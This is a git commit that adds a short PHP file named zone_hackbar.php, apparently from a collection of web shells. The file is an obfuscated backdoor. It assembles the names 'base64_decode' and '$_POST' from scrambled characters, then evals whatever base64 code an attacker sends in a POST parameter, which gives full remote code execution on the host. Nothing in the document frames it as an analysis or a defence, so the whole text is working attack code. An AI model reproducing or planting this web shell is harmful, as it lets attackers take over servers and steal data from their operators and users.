bcd3802f2a13e87d704ccbba7bb3511f9c33a504
tennc <tennc@126.com>
2016-05-14 09:59:03 +0800

    Create zone_hackbar.php

---
+++ php/zone_hackbar.php
@@ -0,0 +1,3 @@
+<?php
+$sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}['n985de9'];if(isset($s22)){eval($s21($s22));}
+?> 
